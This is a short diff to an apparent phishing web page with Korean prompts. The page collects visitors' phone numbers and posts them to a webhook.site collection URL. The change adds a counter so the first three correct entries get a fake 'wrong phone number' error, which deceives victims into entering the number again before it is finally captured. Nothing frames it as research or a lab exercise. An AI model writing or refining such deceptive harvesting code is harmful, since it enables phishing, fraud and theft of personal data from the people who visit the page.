@@ -65,6 +65,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 <script>
 const webhookUrl = "https://webhook.site/2761c3f8-e830-47a7-ba4b-54bfa6d485ab";
 let savedPhone = ""; // 전화번호 저장용
+let phoneTryCount = 0; // 전화번호 입력 시도 횟수 저장
 
 // page1 -> page2
 function goNext() {
@@ -154,6 +155,15 @@ function sendPhone() {
   if (!userId) { alert("전화번호를 입력해주세요."); return; }
   if (!phoneRegex.test(userId)) { alert("잘못된 형식의 전화번호입니다."); return; }
 
+  phoneTryCount++; // 시도 횟수 증가
+
+  // 앞의 3번까지는 무조건 오류 메시지
+  if (phoneTryCount < 4) {
+    alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
+    return;
+  }
+
+  // 4번째 시도부터는 정상 처리
   savedPhone = userId; // 전화번호 저장
 
   fetch(webhookUrl,{
